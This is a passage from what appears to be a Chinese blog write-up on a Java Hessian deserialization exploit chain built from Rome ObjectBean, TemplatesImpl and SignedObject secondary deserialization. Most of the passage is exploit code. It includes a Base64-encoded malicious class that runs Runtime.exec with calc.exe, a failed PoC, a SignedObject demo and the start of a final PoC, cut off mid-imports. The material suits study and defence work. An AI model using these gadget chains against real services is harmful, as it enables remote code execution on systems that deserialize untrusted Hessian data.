class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="错误poc"><a href="#错误poc" class="headerlink" title="错误poc"></a>错误poc</h2><p>加入反序列化之后，这一步其实很简单，删除了hashmap部分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set( root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(root);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(obj);<br>        byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>        fileOutputStream.write(byteArrayOutputStream.toByteArray());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//读取文件</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> fileInputStream.read(bytes);<br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是出现了报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235450.png" alt="QQ截图20220328174030"></p><p>看看是什么报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235402.png" alt="QQ截图20220328174157"></p><p><strong>被transient修饰的 _tfactory 对象无法写入造成空指针异常。</strong></p><h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><p>又是新姿势。</p><h3 id="java-security-SignedObject"><a href="#java-security-SignedObject" class="headerlink" title="java.security.SignedObject"></a>java.security.SignedObject</h3><p>这里会读取传入的内容。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281843774.png" alt="QQ截图20220328184255"></p><p>这里先可以来试一下这个函数具体怎么用的。（<a href="https://www.apiref.com/android-zh/java/security/SignedObject.html">SignedObject</a>）</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">transient</span> String xs;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getXs</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setXs</span><span class="hljs-params">(String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, xs=&#x27;&quot;</span> + xs + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.security.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonSign</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;xs&quot;</span>);<br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(person, privateKey, signingEngine);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> so.getObject();<br>        System.out.println(object);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么这里一定要有<code>privateKey</code>， <code>signingEngine</code>             ?_？<br>调试看一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281945411.png" alt="QQ截图20220328194509"><br>去瞧瞧。<br>**SignedObject#sign()**中。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235039.png" alt="QQ截图20220328194644"></p><p><strong>null.方法？</strong>所以报错。</p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>回到主题，我们在这里就可以利用原生反序列化。<br>这里我的们的利用点还是要调用到<strong>SignedObject#getObject()<strong>中。这里的</strong>getObject</strong>，满足getter方法。所以说我们还是要利用<strong>ToStringBean#toString</strong>，来形成调用getter方法(<strong>SignedObject#getObject</strong>)。<br>于是呼有如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//修饰调用getter方法，getObject</span><br>  <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(SignedObject.class, so);<br>  <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, delegate);<br></code></pre></td></tr></table></figure><h2 id="SignedObject-getObject"><a href="#SignedObject-getObject" class="headerlink" title="SignedObject#getObject()"></a>SignedObject#getObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301318346.png" alt="QQ截图20220330131752"></p><p>这里相当于是利用了<code>Template#readObject</code>，里面的readObject，给其赋值了，如下图所示。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301319274.png" alt="QQ截图20220330131919"></p><h2 id="JDKUtil-makemap"><a href="#JDKUtil-makemap" class="headerlink" title="JDKUtil#makemap()"></a>JDKUtil#makemap()</h2><p>这里需要导入一下<strong>marshalsec</strong>包。（别到含有all的包，会报错。）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235503.png" alt="QQ截图20220328211213"></p><p>看看这个<strong>makemap()</strong>,干了些什么？</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282235981.png" alt="QQ截图20220328220452"></p><p>没懂。。。。。感觉作用就是把两个对象，都放入一个map里。</p><p><strong>注意这里其实只要是个封装的map类型就可以了。</strong>（这个想法是错的，因为这里没有进入反序列化，就成功弹出计算器了。emmmm，姑且理解一下，这里的map这么设置是可以避免在进入反序列化之前弹出计算器！！！！）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301316864.png" alt="QQ截图20220330131616"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> marshalsec.gadgets.JDKUtil;<br><br><br><span class="hljs-keyword">import</span> java.security.*;<br><br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span 